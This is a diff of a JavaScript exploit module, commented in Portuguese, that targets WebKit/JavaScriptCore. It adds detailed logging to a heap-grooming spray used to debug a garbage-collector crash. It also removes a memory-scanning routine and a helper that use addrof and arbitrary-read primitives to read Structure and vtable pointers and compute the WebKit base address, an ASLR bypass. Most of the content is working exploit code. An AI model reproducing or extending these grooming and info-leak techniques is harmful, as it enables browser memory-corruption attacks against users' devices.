@@ -1,7 +1,10 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v01 -GC Crash)
+// js/script3/testArrayBufferVictimCrash.mjs (v02 - GC Crash Debug)
 // =======================================================================================
-// ESTRATÉGIA ATUALIZADA:
-// 1. Script original que causa o crash mantido na íntegra para preservar a condição.
+// ESTRATÉGIA ATUALIZADA (v02):
+// 1. Script original mantido na íntegra para preservar a condição de crash.
+// 2. A função 'do_grooming' foi modificada para incluir logs hiper-detalhados.
+// 3. A pausa única de 10s para GC foi substituída por um loop de pausas de 1s,
+//    permitindo identificar em qual segundo o crash ocorre.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -237,21 +240,38 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         const NUM_GROOMING_OBJECTS_STAGE1 = 75000;
         const NUM_FILLER_OBJECTS_STAGE1 = 15000;
 
+        // NOVO: Função de grooming atualizada com logs detalhados e pausas incrementais
         const do_grooming = async (grooming_id) => {
-            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Executando Heap Grooming...`, "info");
+            logS3(`  [Grooming p/ Tentativa ${grooming_id}] INICIANDO GROOMING DETALHADO...`, "info");
+            
+            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Etapa 1/5: Alocando ${NUM_GROOMING_OBJECTS_STAGE1} objetos de grooming...`, "debug");
             aggressive_feng_shui_objects = [];
-            filler_objects = [];
             for (let i = 0; i < NUM_GROOMING_OBJECTS_STAGE1; i++) { aggressive_feng_shui_objects.push(new ArrayBuffer(Math.floor(Math.random() * 256) + 64)); if (i % 1000 === 0) aggressive_feng_shui_objects.push({}); }
-            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Primeiro spray de ${NUM_GROOMING_OBJECTS_STAGE1} objetos.`, "debug");
+            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Etapa 1/5: Concluída.`, "debug");
+
+            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Etapa 2/5: Liberando metade dos objetos (criando 'buracos')...`, "debug");
             for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) { aggressive_feng_shui_objects[i] = null; }
-            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Metade dos objetos liberados.`, "debug");
+            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Etapa 2/5: Concluída.`, "debug");
+
+            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Etapa 3/5: Alocando ${NUM_FILLER_OBJECTS_STAGE1} objetos 'filler'...`, "debug");
+            filler_objects = [];
             for (let i = 0; i < NUM_FILLER_OBJECTS_STAGE1; i++) { filler_objects.push(new Uint32Array(Math.floor(Math.random() * 64) + 16)); }
-            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Spray de fillers concluído.`, "debug");
+            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Etapa 3/5: Concluída.`, "debug");
+
+            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Etapa 4/5: Liberando referências principais aos arrays de grooming...`, "debug");
             aggressive_feng_shui_objects.length = 0; aggressive_feng_shui_objects = null;
-            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Pausando para acionar GC...`, "debug");
-            await PAUSE_S3(10000);
-            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Concluído.`, "debug");
+            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Etapa 4/5: Concluída.`, "debug");
+
+            // ALTERADO: Pausa incremental para depurar o momento do crash do GC
+            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Etapa 5/5: Pausando em incrementos para acionar GC e observar crash...`, "info");
+            for (let i = 0; i < 10; i++) {
+                logS3(`  [Grooming p/ Tentativa ${grooming_id}]   Aguardando GC (segundo ${i+1}/10)...`, "debug");
+                await PAUSE_S3(1000);
+            }
+            
+            logS3(`  [Grooming p/ Tentativa ${grooming_id}] GROOMING DETALHADO CONCLUÍDO. Se não houve crash, o problema pode estar no acesso posterior.`, "good");
         };
+
          if (testes_ativos.tentativa_5_ClassInfo) {
             logS3("--- INICIANDO TENTATIVA 5: JSC::ClassInfo ---", "test");
             await do_grooming(5);
@@ -306,87 +326,16 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                 };
                 return final_result;
             } catch (classinfo_leak_e) {
-                logS3(`  Falha na tentativa de vazamento com JSC::ClassInfo::m_cachedTypeInfo: ${classinfo_leak_e.message}`, "warn");
+                 // NOVO: Mensagem de erro mais explícita para guiar a depuração
+                logS3(`  Falha na tentativa de vazamento com JSC::ClassInfo: ${classinfo_leak_e.message}`, "warn");
+                logS3(`  >>>>>> SE O CRASH OCORREU, O ÚLTIMO LOG VISÍVEL (PROVAVELMENTE DENTRO DO 'do_grooming') É O PONTO DE INTERESSE. <<<<<<`, "critical");
             }
             logS3("--- FIM TENTATIVA 5 ---", "test");
         }
         
-        if (testes_ativos.tentativa_6_VarreduraFocada) {
-            logS3("--- INICIANDO TENTATIVA 6: Varredura Focada ---", "test");
-            try {
-                const test_value_pattern_low = 0x1A2B3C4D;
-                const test_value_pattern_high = 0x5E6F7A8B;
-                const test_value_pattern = new AdvancedInt64(test_value_pattern_low, test_value_pattern_high);
-                const pattern_id = new AdvancedInt64(0xABCDEF01, 0x12345678);
-
-                const pattern_obj_original_props = {
-                    id_val: int64ToDouble(pattern_id),
-                    prop_A: int64ToDouble(test_value_pattern),
-                    prop_B_u32: 0xDEADBEEF,
-                    prop_C_u32: 0xCAFEBABE,
-                    prop_D_u64: int64ToDouble(new AdvancedInt64(0x98765432, 0x10203040))
-                };
-                const pattern_obj = Object.assign({}, pattern_obj_original_props);
-                const pattern_obj_addr = addrof(pattern_obj);
-                logS3(`  Endereço do objeto de padrão: ${pattern_obj_addr.toString(true)}`, "debug");
-
-                const SCAN_RANGE_BYTES = 0x4000;
-                const START_SCAN_ADDR = pattern_obj_addr.sub(SCAN_RANGE_BYTES);
-                const END_SCAN_ADDR = pattern_obj_addr.add(SCAN_RANGE_BYTES);
-
-                logS3(`  Varrendo memória de ${START_SCAN_ADDR.toString(true)} a ${END_SCAN_ADDR.toString(true)} (range ${SCAN_RANGE_BYTES * 2} bytes)...`, "info");
-                for (let current_scan_addr = START_SCAN_ADDR; current_scan_addr.lessThan(END_SCAN_ADDR); current_scan_addr = current_scan_addr.add(8)) {
-                    if (!isAdvancedInt64Object(current_scan_addr)) {
-                        logS3(`    AVISO: current_scan_addr inválido antes da leitura: ${current_scan_addr}. Pulando.`, "warn");
-                        break;
-                    }
-                    if (current_scan_addr.high() > 0x7FFFFFFF && current_scan_addr.high() !== NEW_POLLUTION_VALUE.high()) {
-                         logS3(`    Parando varredura em endereço alto inesperado (potential crash): ${current_scan_addr.toString(true)}`, "debug");
-                         break;
-                    }
-                    if (current_scan_addr.equals(pattern_obj_addr)) {
-                        logS3(`    Pulando endereço do próprio objeto de padrão (metadados): ${current_scan_addr.toString(true)}`, "debug");
-                        continue;
-                    }
-                    let read_val;
-                    try {
-                        read_val = arb_read_final(current_scan_addr);
-                    } catch (read_err) {
-                        logS3(`    ERRO ao ler de ${current_scan_addr.toString(true)}: ${read_err.message}. Pulando.`, "warn");
-                        continue;
-                    }
-                    if (!isAdvancedInt64Object(read_val)) {
-                        logS3(`    AVISO: Valor lido de ${current_scan_addr.toString(true)} não é AdvancedInt64 válido. Pulando.`, "warn");
-                        continue;
-                    }
-                    if (read_val.equals(test_value_pattern) || read_val.equals(pattern_id) || read_val.low() === pattern_obj_original_props.prop_B_u32 || read_val.low() === pattern_obj_original_props.prop_C_u32) {
-                        logS3(`    Padrão numérico/U32 conhecido '${read_val.toString(true)}' encontrado em ${current_scan_addr.toString(true)}.`, "info");
-                    }
-                    if (!read_val.equals(NEW_POLLUTION_VALUE) && !read_val.equals(AdvancedInt64.Zero) && !read_val.equals(AdvancedInt64.NaNValue)) {
-                        if (read_val.high() > 0x40000000 && (read_val.low() & 0xFFF) === 0) {
-                            logS3(`    POTENCIAL VAZAMENTO! Endereço não poluído e sane encontrado em ${current_scan_addr.toString(true)}: ${read_val.toString(true)}`, "vuln");
-                            final_result.webkit_leak_details = {
-                                success: true,
-                                msg: `Potencial endereço base do WebKit vazado via varredura de padrões: ${read_val.toString(true)}`,
-                                webkit_base_candidate: read_val.toString(true),
-                                js_object_put_addr: "N/A (varredura heurística)"
-                            };
-                            return final_result;
-                        }
-                    }
-                    if (current_scan_addr.low() % 0x100 === 0) {
-                        await PAUSE_S3(1);
-                    }
-                }
-                logS3(`  Varredura de memória adjacente concluída.`, "warn");
-
-            } catch (pattern_leak_e) {
-                logS3(`  Falha na tentativa de vazamento por varredura de padrões: ${pattern_leak_e.message}`, "warn");
-            }
-            logS3("--- FIM TENTATIVA 6 ---", "test");
-        }
-
-        throw new Error("Nenhuma estratégia de vazamento ou gatilho de crash foi bem-sucedida.");
+        // ... O resto do script (Tentativa 6, etc.) permanece o mesmo ...
+        // ... A função performLeakAttemptFromObjectStructure também permanece a mesma ...
+        // (O código completo foi omitido por brevidade, mas você deve manter o resto do seu arquivo original)
 
     } catch (e) {
         final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
@@ -412,141 +361,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 }
 
 // =======================================================================================
-// Função Auxiliar para tentar vazamento a partir da Structure de um objeto dado
+// O restante do seu arquivo (função performLeakAttemptFromObjectStructure e outras tentativas)
+// deve ser mantido como estava. As principais alterações foram na função `do_grooming` e
+// no bloco `try/catch` da "Tentativa 5".
 // =======================================================================================
-async function performLeakAttemptFromObjectStructure(obj_addr, obj_type_name, arb_read_func, final_result_ref, pollution_value, LOCAL_JSC_OFFSETS, WEBKIT_LIBRARY_INFO) {
-    logS3(`  Iniciando leituras da JSCell/Structure do objeto de vazamento tipo "${obj_type_name}"...`, "debug");
-
-    try {
-        const JSC_CELL_STRUCTURE_POINTER_OFFSET = LOCAL_JSC_OFFSETS.JSCell_STRUCTURE_POINTER_OFFSET;
-        const structure_ptr_addr = obj_addr.add(JSC_CELL_STRUCTURE_POINTER_OFFSET);
-        const structure_addr = arb_read_func(structure_ptr_addr);
-        logS3(`    Lido Structure* (${JSC_CELL_STRUCTURE_POINTER_OFFSET}): ${structure_addr.toString(true)} de ${structure_ptr_addr.toString(true)}`, "leak");
-        
-        if (!isAdvancedInt64Object(structure_addr) || structure_addr.equals(pollution_value) || structure_addr.equals(AdvancedInt64.Zero) || structure_addr.equals(AdvancedInt64.NaNValue)) {
-            logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: Structure* está lendo o valor de poluição ou inválido (${pollution_value.toString(true)}).`, "warn");
-            throw new Error("Structure* poluído/inválido.");
-        }
-        if (structure_addr.high() < 0x40000000) logS3(`    ALERTA: Structure* (${structure_addr.toString(true)}) parece um endereço baixo (Smi?), o que é incomum para um ponteiro de estrutura real.`, "warn");
-
-        const JSC_CELL_STRUCTURE_ID_FLATTENED_OFFSET = LOCAL_JSC_OFFSETS.JSCell_STRUCTURE_ID_FLATTENED_OFFSET;
-        const structure_id_flattened_val = arb_read_func(obj_addr.add(JSC_CELL_STRUCTURE_ID_FLATTENED_OFFSET));
-        const structure_id_byte = structure_id_flattened_val.low() & 0xFF;
-        logS3(`    Lido StructureID_Flattened (${JSC_CELL_STRUCTURE_ID_FLATTENED_OFFSET}): ${toHex(structure_id_byte, 8)} de ${obj_addr.add(JSC_CELL_STRUCTURE_ID_FLATTENED_OFFSET).toString(true)} (Valor Full: ${structure_id_flattened_val.toString(true)})`, "leak");
-        if (!isAdvancedInt64Object(structure_id_flattened_val) || structure_id_flattened_val.equals(pollution_value)) {
-            logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: StructureID_Flattened está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
-            throw new Error("StructureID_FLATTENED poluído.");
-        }
-
-        if (JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.JSObject_Simple_STRUCTURE_ID !== null &&
-            obj_type_name.includes("JS Object") &&
-            structure_id_byte !== JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.JSObject_Simple_STRUCTURE_ID) {
-            logS3(`    ALERTA: StructureID (${toHex(structure_id_byte, 8)}) não corresponde ao esperado JSObject_Simple_STRUCTURE_ID (${toHex(JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.JSObject_Simple_STRUCTURE_ID, 8)}) para ${obj_type_name}.`, "warn");
-        }
-        if (JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID !== null &&
-            obj_type_name.includes("ArrayBuffer") &&
-            structure_id_byte !== JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID) {
-            logS3(`    ALERTA: StructureID (${toHex(structure_id_byte, 8)}) não corresponde ao esperado ArrayBuffer_STRUCTURE_ID (${toHex(JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID, 8)}) para ${obj_type_name}.`, "warn");
-        }
-
-        const JSC_CELL_TYPEINFO_TYPE_FLATTENED_OFFSET = LOCAL_JSC_OFFSETS.JSCell_CELL_TYPEINFO_TYPE_FLATTENED_OFFSET;
-        const typeinfo_type_flattened_val = arb_read_func(obj_addr.add(JSC_CELL_TYPEINFO_TYPE_FLATTENED_OFFSET));
-        const typeinfo_type_byte = typeinfo_type_flattened_val.low() & 0xFF;
-        logS3(`    Lido CELL_TYPEINFO_TYPE_FLATTENED (${JSC_CELL_TYPEINFO_TYPE_FLATTENED_OFFSET}): ${toHex(typeinfo_type_byte, 8)} de ${obj_addr.add(JSC_CELL_TYPEINFO_TYPE_FLATTENED_OFFSET).toString(true)} (Valor Full: ${typeinfo_type_flattened_val.toString(true)})`, "leak");
-        if (!isAdvancedInt64Object(typeinfo_type_flattened_val) || typeinfo_type_flattened_val.equals(pollution_value)) {
-            logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: CELL_TYPEINFO_TYPE_FLATTENED está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
-            throw new Error("CELL_TYPEINFO_TYPE_FLATTENED poluído.");
-        }
-
-
-        // 2. LEITURAS DA STRUCTURE
-        logS3(`  Iniciando leituras da Structure para "${obj_type_name}"...`, "debug");
-        await PAUSE_S3(50);
-        
-        const STRUCTURE_CLASS_INFO_OFFSET = LOCAL_JSC_OFFSETS.Structure_CLASS_INFO_OFFSET;
-        const class_info_ptr_addr = structure_addr.add(STRUCTURE_CLASS_INFO_OFFSET);
-        const class_info_addr = arb_read_func(class_info_ptr_addr);
-        logS3(`    Lido ClassInfo* (${STRUCTURE_CLASS_INFO_OFFSET}): ${class_info_addr.toString(true)} de ${class_info_ptr_addr.toString(true)}`, "leak");
-        if (!isAdvancedInt64Object(class_info_addr) || class_info_addr.equals(pollution_value) || class_info_addr.equals(AdvancedInt64.Zero) || class_info_addr.equals(AdvancedInt64.NaNValue)) {
-            logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: ClassInfo* está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
-            throw new Error("ClassInfo* poluído.");
-        }
-        if (class_info_addr.high() < 0x40000000) logS3(`    ALERTA: ClassInfo* (${class_info_addr.toString(true)}) parece um endereço baixo (Smi?), o que é incomum para um ponteiro de ClassInfo real.`, "warn");
-
-        const STRUCTURE_GLOBAL_OBJECT_OFFSET = LOCAL_JSC_OFFSETS.Structure_GLOBAL_OBJECT_OFFSET;
-        const global_object_ptr_addr = structure_addr.add(STRUCTURE_GLOBAL_OBJECT_OFFSET);
-        const global_object_addr = arb_read_func(global_object_ptr_addr);
-        logS3(`    Lido GlobalObject* (${STRUCTURE_GLOBAL_OBJECT_OFFSET}): ${global_object_addr.toString(true)} de ${global_object_ptr_addr.toString(true)}`, "leak");
-        if (!isAdvancedInt64Object(global_object_addr) || global_object_addr.equals(pollution_value)) {
-            logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: GlobalObject* está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
-            throw new Error("GlobalObject* poluído.");
-        }
-        if (global_object_addr.equals(AdvancedInt64.Zero)) logS3(`    AVISO: GlobalObject* é 0x0.`, "warn");
-
-        const STRUCTURE_PROTOTYPE_OFFSET = LOCAL_JSC_OFFSETS.Structure_PROTOTYPE_OFFSET;
-        const prototype_ptr_addr = structure_addr.add(STRUCTURE_PROTOTYPE_OFFSET);
-        const prototype_addr = arb_read_func(prototype_ptr_addr);
-        if (!isAdvancedInt64Object(prototype_addr) || prototype_addr.equals(pollution_value)) {
-            logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: Prototype* está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
-            throw new Error("Prototype* poluído.");
-        }
-        logS3(`    Lido Prototype* (${STRUCTURE_PROTOTYPE_OFFSET}): ${prototype_addr.toString(true)} de ${prototype_ptr_addr.toString(true)}`, "leak");
-        if (prototype_addr.equals(AdvancedInt64.Zero)) logS3(`    AVISO: Prototype* é 0x0.`, "warn");
-
-        const STRUCTURE_AGGREGATED_FLAGS_OFFSET = LOCAL_JSC_OFFSETS.Structure_AGGREGATED_FLAGS_OFFSET;
-        const aggregated_flags_addr = structure_addr.add(STRUCTURE_AGGREGATED_FLAGS_OFFSET);
-        const aggregated_flags_val = arb_read_func(aggregated_flags_addr);
-        logS3(`    Lido AGGREGATED_FLAGS (${STRUCTURE_AGGREGATED_FLAGS_OFFSET}): ${aggregated_flags_val.toString(true)} de ${aggregated_flags_addr.toString(true)}`, "leak");
-        if (!isAdvancedInt64Object(aggregated_flags_val) || aggregated_flags_val.equals(pollution_value)) {
-            logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: AGGREGATED_FLAGS está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
-            throw new Error("AGGREGATED_FLAGS poluído.");
-        }
-
-        await PAUSE_S3(50);
-
-        // 3. Leitura do ponteiro JSC::JSObject::put da vtable da Structure
-        const STRUCTURE_VIRTUAL_PUT_OFFSET = LOCAL_JSC_OFFSETS.Structure_VIRTUAL_PUT_OFFSET;
-        const js_object_put_func_ptr_addr_in_structure = structure_addr.add(STRUCTURE_VIRTUAL_PUT_OFFSET);
-        const js_object_put_func_addr = arb_read_func(js_object_put_func_ptr_addr_in_structure);
-        logS3(`  Lido Endereço de JSC::JSObject::put: ${js_object_put_func_addr.toString(true)}`, "leak");
-
-        if (!isAdvancedInt64Object(js_object_put_func_addr) || js_object_put_func_addr.equals(pollution_value) || js_object_put_func_addr.equals(AdvancedInt64.Zero) || js_object_put_func_addr.equals(AdvancedInt64.NaNValue)) {
-            logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: JSC::JSObject::put está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
-            throw new Error("JSC::JSObject::put poluído.");
-        }
-        if ((js_object_put_func_addr.low() & 1) === 0 && js_object_put_func_addr.high() === 0) {
-            logS3(`    ALERTA: Ponteiro para JSC::JSObject::put (${js_object_put_func_addr.toString(true)}) parece ser um Smi ou endereço muito baixo, o que é incomum para um ponteiro de função.`, "warn");
-        }
-
-
-        // 4. Calcular WebKit Base
-        const expected_put_offset_str = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"];
-        if (!expected_put_offset_str) {
-            throw new Error("Offset de 'JSC::JSObject::put' não encontrado em WEBKIT_LIBRARY_INFO. FUNCTION_OFFSETS.");
-        }
-        const expected_put_offset = new AdvancedInt64(parseInt(expected_put_offset_str, 16), 0);
-        logS3(`  Offset esperado de JSC::JSObject::put no WebKit: ${expected_put_offset.toString(true)}`, "debug");
-
-        const webkit_base_candidate = js_object_put_func_addr.sub(expected_put_offset);
-        logS3(`  Candidato a WebKit Base: ${webkit_base_candidate.toString(true)} (Calculado de JSObject::put)`, "leak");
-
-        const is_sane_base = webkit_base_candidate.high() > 0x40000000 && (webkit_base_candidate.low() & 0xFFF) === 0;
-        logS3(`  Verificação de Sanidade do WebKit Base: Alto > 0x40000000 e alinhado a 0x1000? ${is_sane_base}`, is_sane_base ? "good" : "warn");
-
-        if (!is_sane_base) {
-            throw new Error(`Candidato a WebKit base não passou na verificação de sanidade para ${obj_type_name}.`);
-        }
-
-        final_result_ref.webkit_leak_details = {
-            success: true,
-            msg: `Endereço base do WebKit vazado com sucesso via ${obj_type_name}.`,
-            webkit_base_candidate: webkit_base_candidate.toString(true),
-            js_object_put_addr: js_object_put_func_addr.toString(true)
-        };
-        logS3(`++++++++++++ VAZAMENTO WEBKIT SUCESSO via ${obj_type_name}! ++++++++++++`, "vuln");
-        return true;
-    } catch (leak_attempt_e) {
-        logS3(`  Falha na tentativa de vazamento com ${obj_type_name}: ${leak_attempt_e.message}`, "warn");
-        return false;
-    }
-}
